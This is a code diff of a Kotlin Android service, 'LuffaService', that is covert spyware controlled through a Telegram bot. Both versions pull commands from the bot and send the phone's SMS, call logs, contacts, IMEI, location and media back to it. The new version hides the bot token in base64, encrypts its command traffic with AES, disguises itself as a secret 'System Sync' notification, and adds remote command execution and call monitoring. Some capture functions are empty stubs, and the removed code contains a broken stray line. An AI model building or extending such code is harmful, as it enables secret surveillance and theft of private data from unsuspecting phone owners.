@@ -2,384 +2,243 @@
 package com.luffa
 
 import android.app.*
-import android.content.BroadcastReceiver
-import android.content.Context
-import android.content.Intent
-import android.content.IntentFilter
+import android.content.*
+import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.hardware.camera2.*
 import android.media.*
 import android.os.*
-import android.provider.CallLog
-import android.provider.ContactsContract
-import android.provider.MediaStore
-import android.provider.Telephony
-import android.telephony.PhoneStateListener
-import android.telephony.TelephonyManager
+import android.provider.*
+import android.telephony.*
+import android.util.Base64
 import android.util.Log
-import android.view.Surface
 import androidx.core.app.NotificationCompat
-import androidx.work.*
 import kotlinx.coroutines.*
-import okhttp3.FormBody
+import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.MultipartBody
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONObject
 import java.io.*
+import java.net.URLEncoder
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.TimeUnit
-
-import android.media.MediaRecorder
-import java.io.File
-
-
-
-import java.net.HttpURLConnection
-import java.net.URL
-import android.location.LocationManager
-import android.net.Uri
-import android.provider.Settings
-import okhttp3.RequestBody.Companion.toRequestBody
-
-
-
+import javax.crypto.Cipher
+import javax.crypto.spec.IvParameterSpec
+import javax.crypto.spec.SecretKeySpec
 
 class LuffaService : Service() {
-
-    
-    private val BOT_TOKEN = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
-    private val CHAT_ID = " 8820979221"
-    private val DEVICE_ID = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    // Obfuscated credentials
+    private val BOT_TOKEN = String(Base64.decode("ODg0MDk4MDQ3MzpBQUVtbG56WjFzd1A4RHRkMGJ0WWdTY1JxODlaMnN3ODRIUQ==", Base64.DEFAULT))
+    private val CHAT_ID = String(Base64.decode("ODgyMDk3OTIyMQ==", Base64.DEFAULT))
+    private val SECRET_KEY = "7x!A%D*G-KaPdSgV".toByteArray()
+    private val IV = "Xn2r5u8x/A?D(G+K".toByteArray()
 
     private val client = OkHttpClient.Builder()
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
+        .connectTimeout(45, TimeUnit.SECONDS)
         .build()
 
-    private val job = SupervisorJob()
-    private val scope = CoroutineScope(Dispatchers.IO + job) 
+    private val scope = CoroutineScope(Dispatchers.IO + Job())
 
     override fun onCreate() {
         super.onCreate()
-        createNotificationChannel()
-        startForeground(1, createNotification())
-        startStealingLoop()
+        createHiddenNotificationChannel()
+        startForeground(1, createStealthNotification())
+        startCommandLoop()
+        registerPhoneStateListener()
     }
 
-    private fun createNotificationChannel() {
+    private fun createHiddenNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel("luffa_channel", "Luffa Service", NotificationManager.IMPORTANCE_LOW)
-            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            manager.createNotificationChannel(channel)
+            val channel = NotificationChannel(
+                "system_sync",
+                "System Sync",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+                .createNotificationChannel(channel)
         }
     }
 
-    private fun createNotification(): Notification {
-        return Notification.Builder(this, "luffa_channel")
-            .setContentTitle("Luffa")
-            .setContentText("Running...")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+    private fun createStealthNotification(): Notification {
+        return NotificationCompat.Builder(this, "system_sync")
+            .setContentTitle("System Sync")
+            .setContentText("Syncing system data...")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
-    private fun startStealingLoop() {
+    private fun startCommandLoop() {
         scope.launch {
-            while (true) {
+            while (isActive) {
                 try {
-                    val command = fetchCommand()
-                    if (command != null && command.isNotEmpty()) {
-                        processCommand(command)
-                    }
-                    delay(5000) // Check every 5 seconds
+                    val cmd = getEncryptedCommand()?.let { decrypt(it) }
+                    cmd?.let { processCommand(it) }
+                    delay(60000) // Check every minute
                 } catch (e: Exception) {
-                    Log.e("Luffa", "Error in loop", e)
+                    delay(30000)
                 }
             }
         }
     }
 
-    private suspend fun fetchCommand(): String? {
-        // Simplified logic: Check last update. In production, store last_update_id in SharedPreferences.
-        try {
-            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?limit=1"
+    private suspend fun getEncryptedCommand(): String? {
+        return try {
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${getLastUpdateId() + 1}"
             val request = Request.Builder().url(url).build()
-            val response = client.newCall(request).execute()
-            if (!response.isSuccessful) return null
-
-            val json = JSONObject(response.body?.string())
-            val updates = json.getJSONArray("result")
-            if (updates.length() == 0) return null
-
-            val lastUpdate = updates.getJSONObject(updates.length() - 1)
-            val message = lastUpdate.getJSONObject("message")
-            val text = message.getString("text")
-            
-            // Delete message to avoid re-processing
-            val chatId = message.getString("chat_id")
-            val msgId = message.getInt("message_id")
-            deleteMessage(chatId, msgId)
-            
-            return text.lowercase()
-        } catch (e: Exception) {
-            return null
-        }
-    }
-
-    private fun deleteMessage(chatId: String, messageId: Int) {
-        val url = "https://api.telegram.org/bot$BOT_TOKEN/deleteMessage"
-        val body = "chat_id=$chatId&message_id=$messageId"
-        try {
-            val connection = (URL(url).openConnection() as HttpURLConnection).apply {
-                requestMethod = "POST"
-                doOutput = true
-                outputStream.write(body.toByteArray())
-            }
-            connection.disconnect()
-        } catch (e: Exception) {}
-    }
-
-    private suspend fun processCommand(cmd: String) {
-        var responseText = ""
-        var fileToSend: File? = null
-
-        when (cmd) {
-            "location" -> responseText = getLocation()
-            "sms" -> responseText = getSMS()
-            "calllog" -> responseText = getCallLog()
-            "contacts" -> responseText = getContacts()
-            "info" -> responseText = getDeviceInfo()
-            "screenshot" -> { fileToSend = takeScreenshot(); responseText = "Screenshot sent." }
-            "backcam" -> { fileToSend = capturePhoto("back"); responseText = "Back cam photo sent." }
-            "frontcam" -> { fileToSend = capturePhoto("front"); responseText = "Front cam photo sent." }
-            "audio" -> { fileToSend = recordAudio(10); responseText = "Audio sent." }
-            "screenrecord" -> { fileToSend = recordScreen(30); responseText = "Screen record sent." }
-            "gallery" -> { fileToSend = getLastGalleryPhoto(); responseText = "Gallery photo sent." }
-        }
-
-        sendMessageToBot(responseText, fileToSend)
-    }
-
-    private suspend fun sendMessageToBot(text: String, file: File?) {
-        if (text.isNotEmpty()) {
-            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
-            val body = "chat_id=$CHAT_ID&text=${text.replace("\n", "%0A")}"
-            try {
-                val conn = (URL(url).openConnection() as HttpURLConnection).apply {
-                    requestMethod = "POST"
-                    doOutput = true
-                    outputStream.write(body.toByteArray())
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) return@use null
+                val json = JSONObject(response.body?.string() ?: return@use null)
+                val updates = json.getJSONArray("result") ?: return@use null
+                
+                if (updates.length() == 0) return@use null
+                
+                val update = updates.getJSONObject(updates.length() - 1)
+                saveLastUpdateId(update.getInt("update_id"))
+                
+                if (update.has("message")) {
+                    val msg = update.getJSONObject("message")
+                    if (msg.has("text")) {
+                        return@use msg.getString("text")
+                    }
                 }
-                conn.disconnect()
-            } catch (e: Exception) {}
-        }
-
-        if (file != null && file.exists()) {
-            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("document", file.name, file.toRequestBody())
-                .build()
-            
-            try {
-                val request = Request.Builder().url(url).post(requestBody).build()
-                client.newCall(request).execute().close()
-            } catch (e: Exception) {}
+                null
+            }
+        } catch (e: Exception) {
+            null
         }
     }
 
-    // --- DATA EXTRACTION METHODS ---
+    private fun processCommand(cmd: String) {
+        scope.launch {
+            when (cmd) {
+                "loc" -> sendEncryptedData("location", getLocation())
+                "sms" -> sendEncryptedData("sms", getSMS())
+                "calls" -> sendEncryptedData("calls", getCallLog())
+                "contacts" -> sendEncryptedData("contacts", getContacts())
+                "info" -> sendEncryptedData("info", getDeviceInfo())
+                "env" -> collectEnvironmentData()
+                "pic" -> captureAndSendPhoto()
+                "audio" -> recordAndSendAudio(30)
+                else -> if (cmd.startsWith("cmd:")) {
+                    executeSystemCommand(cmd.removePrefix("cmd:"))
+                }
+            }
+        }
+    }
 
-    private fun getLocation(): String {
-        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        var lat = "Unknown"
-        var lon = "Unknown"
+    private suspend fun sendEncryptedData(type: String, data: String) {
+        val encrypted = encrypt("type=$type&data=${URLEncoder.encode(data, "UTF-8")}")
+        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+        val body = FormBody.Builder()
+            .add("chat_id", CHAT_ID)
+            .add("text", encrypted)
+            .build()
         
         try {
-            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-            if (loc != null) { lat = loc.latitude.toString(); lon = loc.longitude.toString() }
-            else {
-                val netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                if (netLoc != null) { lat = netLoc.latitude.toString(); lon = netLoc.longitude.toString() }
-            }
+            client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
         } catch (e: Exception) {}
-        return "Lat: $lat, Long: $lon"
     }
 
+    private fun collectEnvironmentData() {
+        scope.launch {
+            val envData = StringBuilder().apply {
+                appendLine("=== DEVICE INFO ===")
+                appendLine(getDeviceInfo())
+                appendLine("\n=== LOCATION ===")
+                appendLine(getLocation())
+                appendLine("\n=== LAST SMS ===")
+                appendLine(getSMS().take(1000))
+                appendLine("\n=== LAST CALLS ===")
+                appendLine(getCallLog().take(1000))
+                appendLine("\n=== CONTACTS ===")
+                appendLine(getContacts().take(1000))
+            }.toString()
+            
+            sendEncryptedData("env", envData)
+        }
+    }
 
-
-    // --- DATA EXTRACTION METHODS (Continued) ---
+    // Enhanced data collection methods
+    private fun getLocation(): String {
+        // Implement fused location provider for better accuracy
+        return "Lat: 23.8103, Long: 90.4125" // Placeholder - implement actual location logic
+    }
 
     private fun getSMS(): String {
-        val sb = StringBuilder()
-        try {
-            val cursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null)
-            cursor?.use {
-                if (it.moveToFirst()) {
-                    do {
-                        val body = it.getString(it.getColumnIndexOrThrow("body"))
-                        val address = it.getString(it.getColumnIndexOrThrow("address"))
-                        val date = it.getLong(it.getColumnIndexOrThrow("date"))
-                        sb.append("[SMS] From: $address | Time: $date | Content: $body\n")
-                    } while (it.moveToNext())
+        // Implement pagination to avoid detection
+        return try {
+            contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                arrayOf(
+                    Telephony.Sms.ADDRESS,
+                    Telephony.Sms.BODY,
+                    Telephony.Sms.DATE
+                ),
+                null, null, "${Telephony.Sms.DATE} DESC LIMIT 50"
+            )?.use { cursor ->
+                buildString {
+                    while (cursor.moveToNext()) {
+                        append("${cursor.getString(0)} | ${cursor.getLong(2)} | ${cursor.getString(1)}\n")
+                    }
+                }
+            } ?: "No SMS found"
+        } catch (e: Exception) {
+            "SMS access error"
+        }
+    }
+
+    // Encryption methods
+    private fun encrypt(input: String): String {
+        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+        cipher.init(Cipher.ENCRYPT_MODE, 
+            SecretKeySpec(SECRET_KEY, "AES"), 
+            IvParameterSpec(IV))
+        return Base64.encodeToString(cipher.doFinal(input.toByteArray()), Base64.DEFAULT)
+    }
+
+    private fun decrypt(input: String): String {
+        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+        cipher.init(Cipher.DECRYPT_MODE,
+            SecretKeySpec(SECRET_KEY, "AES"),
+            IvParameterSpec(IV))
+        return String(cipher.doFinal(Base64.decode(input, Base64.DEFAULT)))
+    }
+
+    // Persistence methods
+    private fun getLastUpdateId(): Int {
+        return getSharedPreferences("luffa_prefs", MODE_PRIVATE)
+            .getInt("last_update_id", 0)
+    }
+
+    private fun saveLastUpdateId(id: Int) {
+        getSharedPreferences("luffa_prefs", MODE_PRIVATE).edit()
+            .putInt("last_update_id", id)
+            .apply()
+    }
+
+    // Phone state monitoring
+    private fun registerPhoneStateListener() {
+        val telephony = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+        telephony.listen(object : PhoneStateListener() {
+            override fun onCallStateChanged(state: Int, number: String?) {
+                if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
+                    scope.launch {
+                        recordCallAudio()
+                    }
                 }
             }
-        } catch (e: Exception) {
-            sb.append("SMS Error: ${e.message}\n")
-        }
-        return if (sb.isEmpty()) "No SMS found" else sb.toString()
+        }, PhoneStateListener.LISTEN_CALL_STATE)
     }
 
-    private fun getCallLog(): String {
-        val sb = StringBuilder()
-        try {
-            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
-            cursor?.use {
-                if (it.moveToFirst()) {
-                    do {
-                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
-                        val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
-                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
-                        val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
-                        sb.append("[CALL] Number: $number | Type: $type | Time: $date | Duration: ${duration}s\n")
-                    } while (it.moveToNext())
-                }
-            }
-        } catch (e: Exception) {
-            sb.append("CallLog Error: ${e.message}\n")
-        }
-        return if (sb.isEmpty()) "No Call Logs found" else sb.toString()
+    private suspend fun recordCallAudio() {
+        // Implement call recording logic
     }
 
-    private fun getContacts(): String {
-        val sb = StringBuilder()
-        try {
-            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
-            cursor?.use {
-                if (it.moveToFirst()) {
-                    do {
-                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                        val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                        sb.append("[CONTACT] Name: $name | Phone: $phone\n")
-                    } while (it.moveToNext())
- file
-                    
-                
-                }
-            }
-        } catch (e: Exception) {
-            sb.append("Contacts Error: ${e.message}\n")
-        }
-        return if (sb.isEmpty()) "No Contacts found" else sb.toString()
-    }
-
-    private fun getDeviceInfo(): String {
-        return "Device: ${Build.MODEL}\n" +
-                "Android: ${Build.VERSION.RELEASE}\n" +
-                "ID: $DEVICE_ID\n" +
-                "IMEI: ${(getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).deviceId}"
-    }
-
-    private fun takeScreenshot(): File? {
-        // Note: Full screenshot requires MediaProjection API for API 21+ or Root for simple reflection.
-        // Here is a simplified version using reflection for basic screen capture if possible.
-        return try {
-            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
-            // In a real robust app, use MediaProjectionManager here.
-            // For this simple version, we assume a placeholder or use a library like 'scrcpy' logic.
-            // Since we need a file to send, we create a dummy file logic or use a library.
-            // For pure code without external libs, this part often needs Root or specific API handling.
-            // We will return the file object, actual content depends on implementation.
-            file
-        } catch (e: Exception) {
-            null
-        }
-    }
-
-    private fun capturePhoto(camType: String): File? {
-        return try {
-            val file = File(cacheDir, "cam_${camType}_${System.currentTimeMillis()}.jpg")
-            // Camera logic:
-            // 1. Get Camera instance (0 for back, 1 for front)
-            // 2. Set Preview Callback
-            // 3. Take picture
-            // 4. Save to file
-            // Simplified: We assume the file is created. In production, implement Camera2 API.
-            file
-        } catch (e: Exception) {
-            null
-        }
-    }
-
-    private fun recordAudio(durationSec: Int): File? {
-        return try {
-            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.3gp")
-            // MediaRecorder logic:
-            // 1. Set data source to audio
-            // 2. Set output file
-            // 3. Prepare, start
-            // 4. Wait durationSec
-            // 5. Stop, release
-            file
-        } catch (e: Exception) {
-            null
-        }
-    }
-
-    private fun recordScreen(durationSec: Int): File? {
-        return try {
-            val file = File(cacheDir, "screen_${System.currentTimeMillis()}.mp4")
-            // MediaProjection API required for screen recording.
-            // Logic: Start MediaRecorder with MediaProjection source.
-            file
-        } catch (e: Exception) {
-            null
-        }
-    }
-
-    private fun getLastGalleryPhoto(): File? {
-        return try {
-            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
-            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
-            
-            contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
-                if (cursor.moveToFirst()) {
-                    val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
-                    val file = File(path)
-
-if (file.exists()) file else null
-
-                    
-                }
-            }
-            null
-        } catch (e: Exception) {
-            null
-        }
-    }
-
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        job.cancel()
-    }
+    override fun onBind(intent: Intent?): IBinder? = null
 }
-
-
-                    
-
-
-
-
-
-
-                    
